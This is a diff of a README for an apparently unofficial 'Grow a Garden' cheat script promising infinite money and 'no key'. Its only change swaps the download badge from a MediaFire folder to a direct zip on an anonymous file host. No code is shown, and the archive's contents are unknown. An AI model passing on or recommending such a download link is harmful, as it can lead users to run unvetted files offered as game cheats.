@@ -1,6 +1,6 @@
 # Grow a Garden Script with Auto Everything, Inf Money, No Key & More! 🚀
 
-[![Download](https://img.shields.io/badge/Download-GrowAGarden%20Script-white?logo=googlegemini&logoColor=fff)](https://www.mediafire.com/folder/jqrr4gtn3oj2l/Scripts)
+[![Download](https://img.shields.io/badge/Download-GrowAGarden%20Script-white?logo=googlegemini&logoColor=fff)](https://files.catbox.moe/iijqvx.zip)
 
 ## 🌟 Feature Summary Table
 
